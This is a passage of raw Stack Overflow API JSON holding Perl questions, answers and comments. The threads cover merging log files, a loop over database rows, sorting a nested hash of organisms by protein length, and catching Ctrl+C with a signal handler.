1574482076, "creation_date": 1574427483, "last_edit_date": 1574439050, "question_id": 58994790, "link": "https://stackoverflow.com/questions/58994790/perl-combine-multiple-file-contents-to-single-file", "title": "Perl combine multiple file contents to single file", "body": "<p>I have multiple log files say file1.log file2.log file3.log etc. I want to combine these files contents and put it into single file called result_file.log</p>\n\n<p>Is there any Perl module which can achieve this?</p>\n\n<p><strong>Update: Here is my code</strong></p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\nuse File::Copy;\n\nmy @files;\n\nmy $dir = \"/path/to/directory\";\n\nopendir(DIR, $dir) or die $!;\n\nwhile (my $file = readdir(DIR)) {\n\n    # We only want files\n    next unless (-f \"$dir/$file\");\n\n    # Use a regular expression to find files ending in .log\n    next unless ($file =~ m/\\.log$/);\n\n    print \"$file\\n\";\n\n    push( @files, $file);\n}\n\nclosedir(DIR);\n\nprint Dumper(\\@files);\n\nopen my $out_file, \"&gt;result_file.log\" ;\ncopy($_, $out_file) foreach ( @files );\n\nexit 0;\n</code></pre>\n\n<p>Do you think it is feasible solution?</p>\n"}, {"tags": ["arrays", "perl", "foreach"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1574408223, "post_id": 58988927, "comment_id": 104230345, "body": "No apparent issue with the loop. Either the array actually has one element, or <code>SortSchRec()</code> does something unexpected.  Did you print <code>@stu_dbs</code>?  (There are modules for showing complex data -- I use <code>Data::Dump</code> with its <code>dd</code> and <code>pp</code>, the <code>Data::Dumper</code> is core, there are others.)"}], "answers": [{"tags": [], "owner": {"reputation": 9, "user_id": 12414638, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b19b1420d29de5eda7cc12ae8110fae?s=128&d=identicon&r=PG&f=1", "display_name": "chezhec", "link": "https://stackoverflow.com/users/12414638/chezhec"}, "is_accepted": false, "score": 0, "last_activity_date": 1574747035, "creation_date": 1574747035, "answer_id": 59044476, "question_id": 58988927, "link": "https://stackoverflow.com/questions/58988927/issue-with-array-in-perl/59044476#59044476", "title": "Issue with Array in Perl", "body": "<p>Thanks zdim, i figured out the issue.. had already opened a cursor in previous function as global variable, but introduced this one in between.. changed the cursor variable name and now im able to execute the script.</p>\n"}], "owner": {"reputation": 9, "user_id": 12414638, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b19b1420d29de5eda7cc12ae8110fae?s=128&d=identicon&r=PG&f=1", "display_name": "chezhec", "link": "https://stackoverflow.com/users/12414638/chezhec"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 85, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1574747035, "creation_date": 1574405338, "question_id": 58988927, "link": "https://stackoverflow.com/questions/58988927/issue-with-array-in-perl", "title": "Issue with Array in Perl", "body": "<p>I am new to Perl and now have an issue with below array processing in Perl.</p>\n\n<pre><code>while ( ($stu_id,$gate_nbr) = $cursor-&gt;fetchrow() )\n{\n    foreach my $stu_details (@stu_dbs)\n    {\n        my($stu_no,$sch_id,$lnk_svr_tx) = @$stu_details;\n        if ($stu_no == $stu_id)\n        {\n            SortSchRec($stu_no,$gate_nbr,$sch_id,$sch_tx);\n        }\n    }\n    $log-&gt;writeI(\"Stud ID:\". $stu_id );\n    $log-&gt;writeI(\"Gate ID:\". $gate_nbr);\n}\n\n$cursor-&gt;finish();\n</code></pre>\n\n<p>the above code processes the first array value, but doesnt pick the next array value. Can you let me know what is the issue with this foreach statement and how to fix it?</p>\n"}, {"tags": ["perl", "multidimensional-array", "hash", "protein-database", "perl-hash"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574410624, "post_id": 58985971, "comment_id": 104231267, "body": "Should the output show all with &quot;<i>total number of proteins higher than 100</i>&quot; as the text says or is only the largest one, as in the desired output example?"}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574407412, "post_id": 58986790, "comment_id": 104230022, "body": "Hi Silvar, I&#39;m using strict and warnings, and also [] instead of (), also $ instead of @ while referring a list postiion. I corrected these mistakes, please note this is a shortened version of the actual problem."}], "tags": [], "owner": {"reputation": 705, "user_id": 6490359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/711f0af849e984c1633fe69ae8354b8f?s=128&d=identicon&r=PG&f=1", "display_name": "Silvar", "link": "https://stackoverflow.com/users/6490359/silvar"}, "is_accepted": false, "score": 1, "last_activity_date": 1574391199, "creation_date": 1574391199, "answer_id": 58986790, "question_id": 58985971, "link": "https://stackoverflow.com/questions/58985971/sort-nested-hash-with-multiple-conditions/58986790#58986790", "title": "Sort nested hash with multiple conditions", "body": "<p>Are you using</p>\n\n<pre><code>use strict;\nuse warnings;\n</code></pre>\n\n<p>at the beginning of your script? At least some sources of problems would be highlighted that way. Without them, Perl will silently do stuff that it could easily point out as stupid, pointless or even most likely programming errors.</p>\n\n<hr>\n\n<p>The assignment</p>\n\n<pre><code>$hash{\"snake\"}{ACB2}   = (70, 120);\n</code></pre>\n\n<p>will only assign the value <code>120</code>, since the assignment expects a scalar but you have a bunch of values on the left.</p>\n\n<p>To assign an arrayref, you must explicitly state it:</p>\n\n<pre><code>$hash{\"snake\"}{ACB2}   = [70, 120];\n</code></pre>\n\n<hr>\n\n<p>Your use of sigils (<code>$</code>,<code>@</code>, <code>%</code>) seems off.</p>\n\n<ul>\n<li>Use <code>$</code> if you want to handle a scalar or an individual array or hash value.</li>\n<li>Use <code>@</code> if you want to handle an array (or an array or hash slice (multiple values); e.g. <code>@array[0,2]</code> would return the first and third item from the array <code>@array</code>).</li>\n<li>Use <code>%</code> if you want to handle a hash.</li>\n</ul>\n\n<p>So</p>\n\n<pre><code>@sortedarray[-1]\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>$sortedarray[-1]\n</code></pre>\n\n<p>since you're only accessing a single value.</p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574407869, "post_id": 58987472, "comment_id": 104230199, "body": "It looks like you are reading a file with that while(&lt;DATA&gt;) loop and creating the hash whilst that. I did not mention such a thing, but I got my hash from a .txt file creating the structure I mentioned in the question. Then you create another hash to show results? Isn&#39;t that too long? Isn&#39;t there a way to have a unique hash and show specific information of it?  Besides, organism name should only appear once and the total number of proteins within organism should not apear. Thank you in advance!"}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "reply_to_user": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574449165, "post_id": 58987472, "comment_id": 104250727, "body": "You did not provide a sample of <code>.txt</code> file with data which you read. I have recreated the hash from <code>__DATA__</code> block - my guess is that your <code>.txt</code> file looks quite similar.Then I analyse data and store results in new hash which holds unique record for an organism which comply with your requirements. You ask in comment <i>Isn&#39;t thre a way to have a unique hash and show specific information of it?</i> If you turn variable <code>$debug = 0</code> then you will not see anything. I use <code>print Dumper(...)</code> to demonstrate what was read and stored result. I have mentioned you can print <code>%result</code> in any form."}, {"owner": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574465856, "post_id": 58987472, "comment_id": 104256483, "body": "Well I tried executing without the while(&lt;DATA&gt;) loop and providing the hash instead as I wrote it in the question. I get the following error: Not a HASH reference at ejemplo1.pl line 31. whcih relates to this line:         next if $data-&gt;{totalProteins} &lt; $totalProteinsSearch; the problem is at the totalProteins part..."}], "tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1574449743, "last_edit_date": 1574449743, "creation_date": 1574396465, "answer_id": 58987472, "question_id": 58985971, "link": "https://stackoverflow.com/questions/58985971/sort-nested-hash-with-multiple-conditions/58987472#58987472", "title": "Sort nested hash with multiple conditions", "body": "<p>If I understood you correctly then following code should do what you expect. I keep the result in hash, feel free to print data in any form you heart desire</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy $debug = 1;\n\nmy %data;\nmy $totalProteinsSearch = 100;\n\nwhile( &lt;DATA&gt; ) {\n    chomp;\n    my @row = split ',';\n\n    $data{$row[0]}{$row[1]} = { proteinLength =&gt; $row[2], totalProteins =&gt; $row[3] };\n}\n\nprint Dumper(\\%data) if $debug == 1;\n\nmy %result;\n\nwhile( my($organism,$value) = each %data ) {\n    while( my($proteinID, $data) = each %{$value} ) {\n        next if $data-&gt;{totalProteins} &lt; $totalProteinsSearch;\n        $result{$organism} = {\n                                proteinID =&gt; $proteinID,\n                                proteinLength =&gt; $data-&gt;{proteinLength}, \n                                totalProteins =&gt; $data-&gt;{totalProteins} \n                            }\n            if not defined $result{$organism}\n                or \n            $data-&gt;{proteinLength} &gt; $result{$organism}{proteinLength};\n    }\n}\n\nprint Dumper(\\%result) if $debug;\n\n__DATA__\nsnake,ACB2,70,120\nsnake,SGJK,183,120\nsnake,KDMFS,1213,120\nsnake,VCS2,21,120\nbear,ACB2,12,87\nbear,GASF,131,87\nbear,SDVS,53,87\nmonkey,ACB2,70,230\nmonkey,GMSD,234,230\nmonkey,GJAS,521,230\nmonkey,ASDA,134,230\nmonkey,ASMD,700,230\n</code></pre>\n\n<p>You can print information for example like following [turn off debug <code>$debug = 0</code>]</p>\n\n<pre><code>while( my($organism,$data) = each %result ) {\n    printf \"%s\\nLargetst protein: %s [%d]\\n\\n\",\n            $organism, \n            $data-&gt;{proteinID},\n            $data-&gt;{proteinLength};\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574446871, "post_id": 58990246, "comment_id": 104249816, "body": "@FernandoDelgadoChaves Please let me know if you need comments or explanations here.  This sorts your full list because I am not sure what exactly you wanted (as stated in my answer), but I hope that it is easy to modify it to print only what you want.  If not, please clarify and I can edit."}, {"owner": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574447663, "post_id": 58990246, "comment_id": 104250188, "body": "I&#39;m not familiar with mapping hashes but I guess this works! Isn&#39;t there a way of doing it without external packages?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574448381, "post_id": 58990246, "comment_id": 104250460, "body": "@FernandoDelgadoChaves The &quot;mapping&quot; is a standard way to process a list in perl -- kind of <code>out = map { ... } in</code> where code in that block <code>{...}</code> is applied to each element of <code>in</code> and those transformed elements form <code>out</code>. This allows us to solve the whole thing directly with <code>sort</code> -- without having to iterate over elements etc."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574448589, "post_id": 58990246, "comment_id": 104250521, "body": "@FernandoDelgadoChaves The <code>List::Util</code> is core in modern versions of Perl, so no need to install it.  But, in general: yes, you can do it &quot;<i>without external packages</i>&quot; -- can write a routine to find the largest element of a list, instead of using the existing <code>max</code> (from <code>List::Util</code>).  That&#39;s silly and a road to madness though -- for many jobs it is practically necessary to use &quot;external&quot; libraries (in all programming languages).  If there are problems getting packages installed, that should better be resolved.  In this case, <code>List::Util</code> routines are easy to write yourself."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "edited": false, "score": 0, "creation_date": 1574448959, "post_id": 58990246, "comment_id": 104250647, "body": "@FernandoDelgadoChaves Note that you can install packages as a user, if there are admin issues where you work.  There&#39;s a system how to do it, which is easy and explained in many Stackoverflow posts.  I understand that doing that as well is a distraction, but if you use Perl it&#39;s well worth doing this <i>once</i>.  Libraries (&quot;packages&quot;) are extremely helpful, and often necessary."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 5, "last_activity_date": 1575445523, "last_edit_date": 1575445523, "creation_date": 1574411303, "answer_id": 58990246, "question_id": 58985971, "link": "https://stackoverflow.com/questions/58985971/sort-nested-hash-with-multiple-conditions/58990246#58990246", "title": "Sort nested hash with multiple conditions", "body": "<p>All data sorted in print</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse List::Util qw(max);\n\nmy %hash;   \n$hash{\"snake\"}{ACB2}   = [70, 120];\n$hash{\"snake\"}{SGJK}   = [183, 120];\n$hash{\"snake\"}{KDMFS}   = [1213, 120];\n$hash{\"snake\"}{VCS2}   = [21, 120];\n$hash{\"bear\"}{ACB2}   = [12, 87];\n$hash{\"bear\"}{GASF}   = [131, 87];\n$hash{\"bear\"}{SDVS}   = [53, 87];    \n$hash{\"monkey\"}{ACB2}   = [70, 230];\n$hash{\"monkey\"}{GMSD}   = [234, 230];\n$hash{\"monkey\"}{GJAS}   = [521, 230];\n$hash{\"monkey\"}{ASDA}   = [134, 230];\n$hash{\"monkey\"}{ASMD}   = [700, 230];\n\nmy @top_level_keys_sorted = \n    sort {   \n        ( max map { $hash{$b}{$_}-&gt;[0] } keys %{$hash{$b}} ) &lt;=&gt; \n        ( max map { $hash{$a}{$_}-&gt;[0] } keys %{$hash{$a}} )\n    }   \n    keys %hash;\n\nfor my $k (@top_level_keys_sorted) {\n    say $k; \n    say \"\\t$_ --&gt; @{$hash{$k}{$_}}\" for \n        sort { $hash{$k}{$b}-&gt;[0] &lt;=&gt; $hash{$k}{$a}-&gt;[0] } \n        keys %{$hash{$k}};\n}\n</code></pre>\n\n<p>This first sorts the top-level keys by the first number in the arrayref value, per requirement. With that sorted list of keys on hand we then go inside each key's hashref and sort further.  That loop is what we'd tweak to limit output as wanted (first 100 by total number, only largest by length, etc). </p>\n\n<p>It prints </p>\n\n<pre>\nsnake\n        KDMFS --> 1213 120\n        SGJK --> 183 120\n        ACB2 --> 70 120\n        VCS2 --> 21 120\nmonkey\n        ASMD --> 700 230\n        GJAS --> 521 230\n        GMSD --> 234 230\n        ASDA --> 134 230\n        ACB2 --> 70 230\nbear\n        GASF --> 131 87\n        SDVS --> 53 87\n        ACB2 --> 12 87\n</pre>\n\n<p>I can't tell whether output should show all of \"<em>organisms with a total number of proteins higher than 100</em>\" (text) or only the largest one (desired output) so I am leaving all of it. Cut if off as needed.  To get only the largest one either compare max from each key in the loop or see <a href=\"https://stackoverflow.com/a/59013740/4653379\">this post</a> (same problem).</p>\n\n<p>Note that a hash itself cannot be \"sorted\" as it is inherently unordered. But we can print things out sorted, as above, or generate ancillary data structures which can be sorted, if needed.</p>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 1, "last_activity_date": 1574482889, "last_edit_date": 1574482889, "creation_date": 1574466304, "answer_id": 59003195, "question_id": 58985971, "link": "https://stackoverflow.com/questions/58985971/sort-nested-hash-with-multiple-conditions/59003195#59003195", "title": "Sort nested hash with multiple conditions", "body": "<p>You could use <a href=\"https://metacpan.org/pod/List::Util#reduce\" rel=\"nofollow noreferrer\">List::Util reduce</a> to get the max  per organism.</p>\n\n<p>I realize that you might not be familiar with this function from List::Util but for this question's example, it is pretty straightforward.</p>\n\n<p>The composition of the structure holding the data is a hash of arrays with the organism as the key and the entire line stored in a array reference as the value of the hash.</p>\n\n<p>The choice of a data structure is partly determined by the form of the desired output.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse List::Util qw/reduce/;\n\nuse constant {org_idx =&gt; 0, prot_idx =&gt; 1, len_idx =&gt; 2, cnt_idx =&gt; 3};\n\nmy %stuff;\n\nwhile (&lt;DATA&gt;) {\n    chomp;\n    my @data = split /,/;\n\n    # saving all 4 items (per line)\n    # key is the organism\n    push @{$stuff{$data[org_idx]}}, \\@data; \n}\n\nfor my $org (sort keys %stuff) {\n    my $aref = $stuff{$org}; # an array of arrays reference\n\n    # to find the record with the max length\n    # $max becomes an array reference containing all 4 of the items as a list\n    my $max = reduce{$a-&gt;[len_idx] &gt; $b-&gt;[len_idx] ? $a : $b} @$aref;\n\n    next if $max-&gt;[cnt_idx] &lt; 100;\n\n    print $org, \"\\n\";\n    print \"Largest protein: $max-&gt;[prot_idx] [$max-&gt;[len_idx]]\\n\";\n}\n\n\n\n__DATA__\nsnake,ACB2,70,120\nsnake,SGJK,183,120\nsnake,KDMFS,1213,120\nsnake,VCS2,21,120\nbear,ACB2,12,87\nbear,GASF,131,87\nbear,SDVS,53,87\nmonkey,ACB2,70,230\nmonkey,GMSD,234,230\nmonkey,GJAS,521,230\nmonkey,ASDA,134,230\nmonkey,ASMD,700,230\n</code></pre>\n\n<p>Prints</p>\n\n<pre><code>monkey\nLargest protein: ASMD [700]\nsnake\nLargest protein: KDMFS [1213]\n</code></pre>\n\n<p>Data::Dumper of <code>%stuff</code></p>\n\n<pre><code>$VAR1 = {\n          'monkey' =&gt; [\n                        [\n                          'monkey',\n                          'ACB2',\n                          70,\n                          '230'\n                        ],\n                        [\n                          'monkey',\n                          'GMSD',\n                          234,\n                          '230'\n                        ],\n                        [\n                          'monkey',\n                          'GJAS',\n                          521,\n                          '230'\n                        ],\n                        [\n                          'monkey',\n                          'ASDA',\n                          134,\n                          '230'\n                        ],\n                        [\n                          'monkey',\n                          'ASMD',\n                          700,\n                          '230'\n                        ]\n                      ],\n          'bear' =&gt; [\n                      [\n                        'bear',\n                        'ACB2',\n                        12,\n                        '87'\n                      ],\n                      [\n                        'bear',\n                        'GASF',\n                        131,\n                        '87'\n                      ],\n                      [\n                        'bear',\n                        'SDVS',\n                        53,\n                        '87'\n                      ]\n                    ],\n          'snake' =&gt; [\n                       [\n                         'snake',\n                         'ACB2',\n                         70,\n                         '120'\n                       ],\n                       [\n                         'snake',\n                         'SGJK',\n                         183,\n                         '120'\n                       ],\n                       [\n                         'snake',\n                         'KDMFS',\n                         1213,\n                         '120'\n                       ],\n                       [\n                         'snake',\n                         'VCS2',\n                         21,\n                         '120'\n                       ]\n                     ]\n        };\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 9642405, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-j2oYD91Xc-M/AAAAAAAAAAI/AAAAAAAAxGI/KWWCZiIIW3Y/photo.jpg?sz=128", "display_name": "Fernando Delgado Chaves", "link": "https://stackoverflow.com/users/9642405/fernando-delgado-chaves"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 58990246, "answer_count": 4, "score": 1, "last_activity_date": 1575445523, "creation_date": 1574384352, "last_edit_date": 1574411800, "question_id": 58985971, "link": "https://stackoverflow.com/questions/58985971/sort-nested-hash-with-multiple-conditions", "title": "Sort nested hash with multiple conditions", "body": "<p>I'm somewhat new to perl programming and I've got a hash which could be formulated like this:</p>\n\n<pre><code>$hash{\"snake\"}{ACB2}   = [70, 120];\n$hash{\"snake\"}{SGJK}   = [183, 120];\n$hash{\"snake\"}{KDMFS}   = [1213, 120];\n$hash{\"snake\"}{VCS2}   = [21, 120];\n...\n$hash{\"bear\"}{ACB2}   = [12, 87];\n$hash{\"bear\"}{GASF}   = [131, 87];\n$hash{\"bear\"}{SDVS}   = [53, 87];\n...\n$hash{\"monkey\"}{ACB2}   = [70, 230];\n$hash{\"monkey\"}{GMSD}   = [234, 230];\n$hash{\"monkey\"}{GJAS}   = [521, 230];\n$hash{\"monkey\"}{ASDA}   = [134, 230];\n$hash{\"monkey\"}{ASMD}   = [700, 230];\n</code></pre>\n\n<p>The structure of the hash is in summary:</p>\n\n<pre><code>%hash{Organism}{ProteinID}=(protein_length, total_of_proteins_in_that_organism)\n</code></pre>\n\n<p>I would like to sort this hash according to some conditions. First, I would only like to take into consideration those organisms with a total number of proteins higher than 100, then I would like to show the name of the organism as well as the largest protein and its length.</p>\n\n<p>For this, I'm going for the following approach:</p>\n\n<pre><code>    foreach my $org (sort keys %hash) {\n        foreach my $prot (keys %{ $hash{$org} }) {\n            if ($hash{$org}{$prot}[1] &gt; 100) {\n                @sortedarray = sort {$hash{$b}[0]&lt;=&gt;$hash{$a}[0]} keys %hash;\n\n                print $org.\"\\n\";\n                print @sortedarray[-1].\"\\n\";\n                print $hash{$org}{$sortedarray[-1]}[0].\"\\n\"; \n            }\n        }\n    }\n</code></pre>\n\n<p>However, this prints the name of the organism as many times as the total number of proteins, for instance, it prints \"snake\" 120 times. Besides, this is not sorting properly because i guess I should make use of the variables $org and $prot in the sorting line. </p>\n\n<p>Finally, the output should look like this:</p>\n\n<pre><code>snake\n\"Largest protein\": KDMFS [1213]\n\nmonkey\n\"Largest protein\": ASMD [700]\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 1, "creation_date": 1574372922, "post_id": 58984231, "comment_id": 104221104, "body": "see <a href=\"https://stackoverflow.com/questions/3078508/how-to-run-piece-of-code-just-before-the-exit-of-perl-script\" title=\"how to run piece of code just before the exit of perl script\">stackoverflow.com/questions/3078508/&hellip;</a>"}, {"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "reply_to_user": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1574375113, "post_id": 58984231, "comment_id": 104221859, "body": "@Robert thanks for the reference. I placed an END block in the script (not in any subroutine), and it does not execute when I ctrl C out of the script."}, {"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 1, "creation_date": 1574375377, "post_id": 58984231, "comment_id": 104221958, "body": "Read the other answers in the linked question as well. You need to handle the signal from Ctrl+C: <code>$SIG{TERM} = \\&amp;signal_handler;</code>"}, {"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "reply_to_user": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1574375780, "post_id": 58984231, "comment_id": 104222079, "body": "I have the signal_handler, but it&#39;s not catching it. I&#39;m printing some text, and I&#39;m not seeing that text from a ctrl C"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1574383581, "post_id": 58984231, "comment_id": 104224090, "body": "Can you show a minimal complete example of the problem?  A signal handler should be it."}, {"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574441186, "post_id": 58984231, "comment_id": 104247215, "body": "@zdim I added the signal handler code. The rest of the code itself is very complex so I thought pseudo code would make it easier. In this particular case, I don&#39;t think the actual code is important, but please correct me if I&#39;m wrong."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574444877, "post_id": 58984231, "comment_id": 104248964, "body": "Thank you -- yes, that should be fine.  And ... that should work.  Does this run in a terminal?  (In your &quot;real&quot; signal handler you have more done, yes? Things that you&#39;d see regardless of how the program runs?)  Can it be that the handler fires just fine but that log-rotation doesn&#39;t work correctly (out of the handler)?  Add something yet else to it -- like writing a silly file in your home directory (you should have permissions for that?)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": 